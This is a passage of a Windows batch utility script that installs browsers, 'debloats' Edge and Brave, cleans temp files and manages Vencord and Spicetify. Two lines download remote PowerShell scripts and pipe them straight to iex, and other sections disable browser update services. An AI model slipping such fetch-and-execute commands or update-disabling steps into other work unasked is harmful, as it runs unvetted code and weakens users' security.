    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_PALEMOON
echo Installing Pale Moon (Firefox-based)...
powershell -Command "iwr -useb https://www.palemoon.org/download/main/win64/ -OutFile $env:TEMP\PaleMoonInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\PaleMoonInstaller.exe" /silent
    if %ERRORLEVEL% equ 0 (
        echo Pale Moon installed successfully.
        echo Note: uBlock Origin must be installed manually from addons.mozilla.org.
    ) else (
        echo Failed to install Pale Moon.
    )
    del "%TEMP%\PaleMoonInstaller.exe" 2>nul
) else (
    echo Failed to download Pale Moon installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:INSTALL_TOR
echo Installing Tor Browser (Firefox-based)...
powershell -Command "iwr -useb https://www.torproject.org/dist/torbrowser/13.5.1/torbrowser-install-win64-13.5.1_en-US.exe -OutFile $env:TEMP\TorInstaller.exe"
if %ERRORLEVEL% equ 0 (
    start /wait "" "%TEMP%\TorInstaller.exe" /S
    if %ERRORLEVEL% equ 0 (
        echo Tor Browser installed successfully.
        echo Note: Tor Browser does not support uBlock Origin due to security restrictions.
    ) else (
        echo Failed to install Tor Browser.
    )
    del "%TEMP%\TorInstaller.exe" 2>nul
) else (
    echo Failed to download Tor Browser installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_BROWSERS_INSTALLATION

:LIST_DEBLOAT_OPTIONS
echo.
echo Debloat options available:
echo [1] Debloat Microsoft Edge
echo [2] Debloat Brave
echo [3] Return to Browser Management Menu
set "DEBLOAT_CHOICE="
set /p DEBLOAT_CHOICE=Enter your choice (1-3): 
if "!DEBLOAT_CHOICE!"=="1" goto :DEBLOAT_EDGE
if "!DEBLOAT_CHOICE!"=="2" goto :DEBLOAT_BRAVE
if "!DEBLOAT_CHOICE!"=="3" goto :BROWSER_MENU
echo Invalid choice. Please enter 1, 2, or 3.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_DEBLOAT_OPTIONS

:DEBLOAT_EDGE
echo Debloating Microsoft Edge...
echo Note: This requires administrative privileges.
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v CreateDesktopShortcutDefault /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v PersonalizationReportingEnabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v ShowRecommendationsEnabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v HideFindOnExperience /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v ConfigureNotTrack /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v AlterErrorPagesEnabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v EdgeCollectionsEnabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v EdgeShoppingAssistantEnabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v PersonalizationReportingEnabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v ShowMicrosoftRewards /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v WebWidgetAllowed /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v DiagnosticsData /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v EdgeAssetDeliveryServiceEnabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge" /v CryptoWalletEnabled /t REG_DWORD /d 0 /f >nul 2>&1
sc stop MicrosoftEdgeElevationService >nul 2>&1
sc config MicrosoftEdgeElevationService start=disabled >nul 2>&1
sc stop edgeupdate >nul 2>&1
sc config edgeupdate start=disabled >nul 2>&1
sc stop edgeupdatem >nul 2>&1
sc config edgeupdatem start=disabled >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Microsoft Edge debloating completed successfully.
) else (
    echo Some Microsoft Edge debloating settings may not have applied. Please run as administrator.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_DEBLOAT_OPTIONS

:DEBLOAT_BRAVE
echo Debloating Brave...
echo Note: This requires administrative privileges.
reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave" /v BraveRewardsDisabled /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave" /v BraveVPNDisabled /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\BraveSoftware\Brave" /v BraveAIChatEnabled /t REG_DWORD /d 0 /f >nul 2>&1
sc stop BraveElevationService >nul 2>&1
sc config BraveElevationService start=disabled >nul 2>&1
sc stop Brave >nul 2>&1
sc config Brave start=disabled >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CrossDevice\Resume" /v ConfigurationIsResumeAllowed /t REG_DWORD /d 1 /f >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Brave debloating completed successfully.
) else (
    echo Some Brave debloating settings may not have applied. Please run as administrator.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :LIST_DEBLOAT_OPTIONS

:RUN_CHRIS_TITUS
echo Running Chris Titus Tech Tool...
powershell -Command "iwr -useb https://christitus.com/win | iex"
if %ERRORLEVEL% equ 0 (
    echo Chris Titus Tech Tool executed successfully.
) else (
    echo Failed to run Chris Titus Tech Tool.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SYSTEM_MANAGEMENT

:CLEAN_TEMP_FILES
echo Starting cleanup of temporary files from "%TEMP%"...
set "TEMP_PATH=%TEMP%"
set "LOG_FILE=%TEMP%\cleanup_log.txt"

:: Ensure log file is writable
echo Testing log file writability...
echo Testing log file writability... > "%LOG_FILE%" 2>nul
if %ERRORLEVEL% neq 0 (
    echo Error: Cannot write to log file at "%LOG_FILE%". Check permissions or disk space.
    echo Falling back to alternative log file at "%USERPROFILE%\Desktop\cleanup_log.txt"...
    set "LOG_FILE=%USERPROFILE%\Desktop\cleanup_log.txt"
    echo Testing log file writability... > "%LOG_FILE%" 2>nul
    if %ERRORLEVEL% neq 0 (
        echo Error: Cannot write to alternative log file at "%LOG_FILE%". Aborting cleanup.
        pause
        if exist "!CONFIG_FILE!" (
            for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
                set "SAVED_COLOR=%%C"
                color !SAVED_COLOR!
            )
        )
        goto :SYSTEM_MANAGEMENT
    )
)
echo [%DATE% %TIME%] Starting cleanup of temporary files from "%TEMP_PATH%"... >> "%LOG_FILE%"

:: Verify TEMP folder exists
echo Checking if TEMP folder exists...
if not exist "%TEMP_PATH%\" (
    echo TEMP folder does not exist: "%TEMP_PATH%". Skipping cleanup.
    echo [%DATE% %TIME%] TEMP folder does not exist: "%TEMP_PATH%". Skipping cleanup. >> "%LOG_FILE%"
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :SYSTEM_MANAGEMENT
)
echo TEMP folder exists: "%TEMP_PATH%".
echo [%DATE% %TIME%] TEMP folder exists: "%TEMP_PATH%". >> "%LOG_FILE%"

set "FILES_FOUND=0"
set "FILES_DELETED=0"
set "DIR_FOUND=0"
set "DIR_DELETED=0"
set "ERROR_COUNT=0"
set "ERROR_LIST="

:: Delete all files in TEMP, skipping in-use or protected files
echo Deleting files in %TEMP_PATH%...
echo [%DATE% %TIME%] Deleting files in %TEMP_PATH%... >> "%LOG_FILE%"
for %%F in ("%TEMP_PATH%\*.*") do (
    set /a FILES_FOUND+=1
    del /F /Q "%%F" 2>nul
    if !ERRORLEVEL! equ 0 (
        set /a FILES_DELETED+=1
        echo Deleted file: %%F >> "%LOG_FILE%"
        echo Deleted file: %%F
    ) else (
        set /a ERROR_COUNT+=1
        set "ERROR_LIST=!ERROR_LIST! File: %%F;"
        echo Skipped file: %%F (may be in use or protected) >> "%LOG_FILE%"
        echo Skipped file: %%F (may be in use or protected)
    )
)

:: Delete all directories in TEMP, skipping in-use or protected directories
echo Deleting directories in %TEMP_PATH%...
echo [%DATE% %TIME%] Deleting directories in %TEMP_PATH%... >> "%LOG_FILE%"
for /d %%D in ("%TEMP_PATH%\*") do (
    set /a DIR_FOUND+=1
    rd /S /Q "%%D" 2>nul
    if !ERRORLEVEL! equ 0 (
        set /a DIR_DELETED+=1
        echo Deleted directory: %%D >> "%LOG_FILE%"
        echo Deleted directory: %%D
    ) else (
        set /a ERROR_COUNT+=1
        set "ERROR_LIST=!ERROR_LIST! Directory: %%D;"
        echo Skipped directory: %%D (may be in use or protected) >> "%LOG_FILE%"
        echo Skipped directory: %%D (may be in use or protected)
    )
)

:: Summary of cleanup
echo.
echo Cleanup Summary:
echo Found %FILES_FOUND% files, deleted %FILES_DELETED%.
echo Found %DIR_FOUND% directories, deleted %DIR_DELETED%.
echo Encountered %ERROR_COUNT% errors.
if %ERROR_COUNT% gtr 0 (
    echo Errors occurred: %ERROR_LIST%
    echo [%DATE% %TIME%] Errors occurred: %ERROR_LIST% >> "%LOG_FILE%"
    echo If files or directories were skipped, ensure the script is run as administrator.
    echo Check permissions with: icacls "%TEMP_PATH%"
)
echo [%DATE% %TIME%] Cleanup Summary: Found %FILES_FOUND% files, deleted %FILES_DELETED%; Found %DIR_FOUND% directories, deleted %DIR_DELETED%; Errors: %ERROR_COUNT% >> "%LOG_FILE%"

echo Temporary file cleanup complete.
echo [%DATE% %TIME%] Temporary file cleanup complete. >> "%LOG_FILE%"
echo Press any key to return to the System Management menu...
pause >nul
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SYSTEM_MANAGEMENT

:VENCORD_CHECK_DEPENDENCIES
echo Checking Vencord dependencies...
echo Note: This requires administrative privileges and an internet connection.
:: Check for Git
where git >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Git is already installed.
    goto :VENCORD_MENU
)
echo Git is not installed. Downloading and installing Git...
powershell -Command "iwr -useb https://github.com/git-for-windows/git/releases/latest/download/Git-2.45.2-64-bit.exe -OutFile $env:TEMP\GitInstaller.exe"
if %ERRORLEVEL% equ 0 (
    echo Installing Git (silent installation)...
    start /wait "" "%TEMP%\GitInstaller.exe" /VERYSILENT /NORESTART
    if %ERRORLEVEL% equ 0 (
        echo Git installed successfully.
        setx PATH "%PATH%;C:\Program Files\Git\bin" /M
    ) else (
        echo Failed to install Git. Please install manually from https://git-scm.com/download/win and try again.
        pause
        if exist "!CONFIG_FILE!" (
            for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
                set "SAVED_COLOR=%%C"
                color !SAVED_COLOR!
            )
        )
        goto :MENU
    )
    del "%TEMP%\GitInstaller.exe" 2>nul
) else (
    echo Failed to download Git installer. Please check your internet connection or install Git manually from https://git-scm.com/download/win.
    pause
	if exist "!CONFIG_FILE!" (
		for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
			set "SAVED_COLOR=%%C"
			color !SAVED_COLOR!
		)
	)
    goto :MENU
)
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :VENCORD_MENU

:VENCORD_MENU
echo.
echo Vencord Management Menu:
echo [1] Download Vencord Installer
echo [2] Download Vencord Source Code
echo [3] Return to main menu
set "VENCORD_CHOICE="
set /p VENCORD_CHOICE=Enter your choice (1-3): 
if "!VENCORD_CHOICE!"=="1" goto :DOWNLOAD_VENCORD_INSTALLER
if "!VENCORD_CHOICE!"=="2" goto :DOWNLOAD_VENCORD_SOURCE
if "!VENCORD_CHOICE!"=="3" goto :MENU
echo Invalid choice. Please enter 1, 2, or 3.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :VENCORD_MENU

:DOWNLOAD_VENCORD_INSTALLER
echo Downloading Vencord Installer...
echo Note: Using Vencord may violate Discord's Terms of Service. Proceed at your own risk.
powershell -Command "iwr -useb https://github.com/Vencord/Installer/releases/latest/download/VencordInstaller.exe -OutFile $env:USERPROFILE\Downloads\VencordInstaller.exe"
if %ERRORLEVEL% equ 0 (
    echo Vencord Installer downloaded successfully to %USERPROFILE%\Downloads\VencordInstaller.exe
) else (
    echo Failed to download Vencord Installer.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :VENCORD_MENU

:DOWNLOAD_VENCORD_SOURCE
echo Note: Using Vencord may violate Discord's Terms of Service. Proceed at your own risk.
:VENCORD_PATH_PROMPT
set "VENCORD_PATH="
echo Please enter the full path to the folder where you want to download Vencord source (e.g., C:\Path\To\Folder)
set /p VENCORD_PATH=Path: 
if not defined VENCORD_PATH (
    echo No input provided. Please try again.
    pause
	if exist "!CONFIG_FILE!" (
		for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
			set "SAVED_COLOR=%%C"
			color !SAVED_COLOR!
		)
	)
    goto :VENCORD_PATH_PROMPT
)
set "VENCORD_PATH=!VENCORD_PATH:"=!"
if not exist "!VENCORD_PATH!\" (
    mkdir "!VENCORD_PATH!" 2>nul
    if %ERRORLEVEL% neq 0 (
        echo Failed to create folder "!VENCORD_PATH!". Please try again.
        pause
        if exist "!CONFIG_FILE!" (
            for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
                set "SAVED_COLOR=%%C"
                color !SAVED_COLOR!
            )
        )
        goto :VENCORD_PATH_PROMPT
    )
)
echo test > "!VENCORD_PATH!\testfile.txt" 2>nul
if %ERRORLEVEL% neq 0 (
    echo The folder "!VENCORD_PATH!" is not writable. Please try another folder.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :VENCORD_PATH_PROMPT
)
del "!VENCORD_PATH!\testfile.txt" 2>nul
echo Downloading Vencord source code to "!VENCORD_PATH!"...
git clone https://github.com/Vencord/Vencord.git "!VENCORD_PATH!\Vencord"
if %ERRORLEVEL% equ 0 (
    echo Vencord source code downloaded successfully to "!VENCORD_PATH!\Vencord"
) else (
    echo Failed to download Vencord source code.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :VENCORD_MENU

:SPOTIFY_PROMPT
echo Default Spotify path: %DEFAULT_SPOTIFY_PATH%
set "USER_CONFIRM="
set /p USER_CONFIRM=Is this path correct? (Y/N)? 
if /i "!USER_CONFIRM!"=="Y" (
    set "SPOTIFY_PATH=%DEFAULT_SPOTIFY_PATH%"
    goto :PATH_SET
)
if /i "!USER_CONFIRM!"=="N" (
    :CUSTOM_INPUT
    set "SPOTIFY_PATH="
    echo Please enter the full path to Spotify.exe (e.g., C:\Path\To\Spotify.exe)
    set /p SPOTIFY_PATH=Path: 
    if not defined SPOTIFY_PATH (
        echo No input provided. Please try again.
        pause
        if exist "!CONFIG_FILE!" (
            for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
                set "SAVED_COLOR=%%C"
                color !SAVED_COLOR!
            )
        )
        goto :CUSTOM_INPUT
    )
    set "SPOTIFY_PATH=!SPOTIFY_PATH:"=!"
    if not exist "!SPOTIFY_PATH!" (
        echo Spotify.exe not found at "!SPOTIFY_PATH!". Please try again.
        pause
        if exist "!CONFIG_FILE!" (
            for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
                set "SAVED_COLOR=%%C"
                color !SAVED_COLOR!
            )
        )
        goto :CUSTOM_INPUT
    )
    goto :PATH_SET
)
echo Invalid input. Please enter Y or N.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SPOTIFY_PROMPT

:PATH_SET
if not exist "!SPOTIFY_PATH!" (
    echo Error: Spotify executable not found at "!SPOTIFY_PATH!". Exiting.
    pause
    if exist "!CONFIG_FILE!" (
        for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
            set "SAVED_COLOR=%%C"
            color !SAVED_COLOR!
        )
    )
    goto :MENU
)

:SPICETIFY_MENU
echo.
echo Spicetify Management Menu:
echo [1] Install and update Spicetify
echo [2] Update current Spicetify version
echo [3] Uninstall Spicetify
echo [4] Block Spotify updates
echo [5] Unblock Spotify updates
echo [6] Return to main menu
set "SPICETIFY_CHOICE="
set /p SPICETIFY_CHOICE=Enter your choice (1-6): 
if "!SPICETIFY_CHOICE!"=="1" goto :INSTALL_AND_UPDATE
if "!SPICETIFY_CHOICE!"=="2" goto :UPDATE_ONLY
if "!SPICETIFY_CHOICE!"=="3" goto :UNINSTALL
if "!SPICETIFY_CHOICE!"=="4" goto :BLOCK_UPDATES
if "!SPICETIFY_CHOICE!"=="5" goto :UNBLOCK_UPDATES
if "!SPICETIFY_CHOICE!"=="6" goto :MENU
echo Invalid choice. Please enter 1, 2, 3, 4, 5, or 6.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SPICETIFY_MENU

:INSTALL_AND_UPDATE
tasklist | find /i "Spotify.exe" >nul
if %ERRORLEVEL% equ 0 (
    echo Spotify is running. Closing it...
    taskkill /im Spotify.exe /f
    set "SPOTIFY_WAS_RUNNING=1"
) else (
    echo Spotify is not running.
    set "SPOTIFY_WAS_RUNNING=0"
)
where spicetify >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Spicetify is already installed. Checking for updates...
    spicetify upgrade --bypass-admin
    if %ERRORLEVEL% equ 0 (
        echo Spicetify is up to date or has been updated.
    ) else (
        echo Failed to update Spicetify. Proceeding anyway.
    )
) else (
    echo Spicetify is not installed. Installing now...
    powershell -Command "iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex"
    if %ERRORLEVEL% equ 0 (
        echo Spicetify installed successfully.
        echo Checking for Spicetify updates...
        spicetify upgrade --bypass-admin
        if %ERRORLEVEL% equ 0 (
            echo Spicetify is up to date or has been updated.
        ) else (
            echo Failed to update Spicetify. Proceeding anyway.
        )
    ) else (
        echo Failed to install Spicetify. Exiting.
        pause
		if exist "!CONFIG_FILE!" (
			for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
				set "SAVED_COLOR=%%C"
				color !SAVED_COLOR!
			)
		)
        goto :SPICETIFY_MENU
    )
)
if %SPOTIFY_WAS_RUNNING% equ 1 (
    echo Restarting Spotify...
    start "" "!SPOTIFY_PATH!"
)
echo Installation and update process complete.
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SPICETIFY_MENU

:UPDATE_ONLY
tasklist | find /i "Spotify.exe" >nul
if %ERRORLEVEL% equ 0 (
    echo Spotify is running. Closing it...
    taskkill /im Spotify.exe /f
    set "SPOTIFY_WAS_RUNNING=1"
) else (
    echo Spotify is not running.
    set "SPOTIFY_WAS_RUNNING=0"
)
where spicetify >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Checking for Spicetify updates...
    spicetify upgrade --bypass-admin
    if %ERRORLEVEL% equ 0 (
        echo Spicetify is up to date or has been updated.
    ) else (
        echo Failed to update Spicetify.
    )
) else (
    echo Spicetify is not installed. Please choose 'Install and update' to install it first.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SPICETIFY_MENU

:UNINSTALL
tasklist | find /i "Spotify.exe" >nul
if %ERRORLEVEL% equ 0 (
    echo Spotify is running. Closing it...
    taskkill /im Spotify.exe /f
    set "SPOTIFY_WAS_RUNNING=1"
) else (
    echo Spotify is not running.
    set "SPOTIFY_WAS_RUNNING=0"
)
where spicetify >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Uninstalling Spicetify...
    tasklist | find /i "Spotify.exe" >nul
    if %ERRORLEVEL% equ 0 (
        echo Spotify is running. Closing it...
        taskkill /im Spotify.exe /f
        set "SPOTIFY_WAS_RUNNING=1"
    ) else (
        set "SPOTIFY_WAS_RUNNING=0"
    )
    spicetify restore --bypass-admin
    if %ERRORLEVEL% equ 0 (
        echo Spicetify uninstalled successfully.
    ) else (
        echo Failed to uninstall Spicetify.
    )
    if %SPOTIFY_WAS_RUNNING% equ 1 (
        echo Restarting Spotify...
        start "" "!SPOTIFY_PATH!"
    )
) else (
    echo Spicetify is not installed. Nothing to uninstall.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SPICETIFY_MENU

:BLOCK_UPDATES
tasklist | find /i "Spotify.exe" >nul
if %ERRORLEVEL% equ 0 (
    echo Spotify is running. Closing it...
    taskkill /im Spotify.exe /f
    set "SPOTIFY_WAS_RUNNING=1"
) else (
    echo Spotify is not running.
    set "SPOTIFY_WAS_RUNNING=0"
)
where spicetify >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Blocking Spotify updates...
    tasklist | find /i "Spotify.exe" >nul
    if %ERRORLEVEL% equ 0 (
        echo Spotify is running. Closing it...
        taskkill /im Spotify.exe /f
        set "SPOTIFY_WAS_RUNNING=1"
    ) else (
        set "SPOTIFY_WAS_RUNNING=0"
    )
    spicetify spotify-updates block --bypass-admin
    if %ERRORLEVEL% equ 0 (
        echo Spotify updates blocked successfully.
    ) else (
        echo Failed to block Spotify updates.
    )
    if %SPOTIFY_WAS_RUNNING% equ 1 (
        echo Restarting Spotify...
        start "" "!SPOTIFY_PATH!"
    )
) else (
    echo Spicetify is not installed. Please choose 'Install and update' to install it first.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SPICETIFY_MENU

:UNBLOCK_UPDATES
tasklist | find /i "Spotify.exe" >nul
if %ERRORLEVEL% equ 0 (
    echo Spotify is running. Closing it...
    taskkill /im Spotify.exe /f
    set "SPOTIFY_WAS_RUNNING=1"
) else (
    echo Spotify is not running.
    set "SPOTIFY_WAS_RUNNING=0"
)
where spicetify >nul 2>&1
if %ERRORLEVEL% equ 0 (
    echo Unblocking Spotify updates...
    tasklist | find /i "Spotify.exe" >nul
    if %ERRORLEVEL% equ 0 (
        echo Spotify is running. Closing it...
        taskkill /im Spotify.exe /f
        set "SPOTIFY_WAS_RUNNING=1"
    ) else (
        set "SPOTIFY_WAS_RUNNING=0"
    )
    spicetify spotify-updates unblock --bypass-admin
    if %ERRORLEVEL% equ 0 (
        echo Spotify updates unblocked successfully.
    ) else (
        echo Failed to unblock Spotify updates.
    )
    if %SPOTIFY_WAS_RUNNING% equ 1 (
        echo Restarting Spotify...
        start "" "!SPOTIFY_PATH!"
    )
) else (
    echo Spicetify is not installed. Please choose 'Install and update' to install it first.
)
pause
if exist "!CONFIG_FILE!" (
    for /f "tokens=2 delims==" %%C in ('findstr /B "Color=" "!CONFIG_FILE!"') do (
        set "SAVED_COLOR=%%C"
        color !SAVED_COLOR!
    )
)
goto :SPICETIFY_MENU
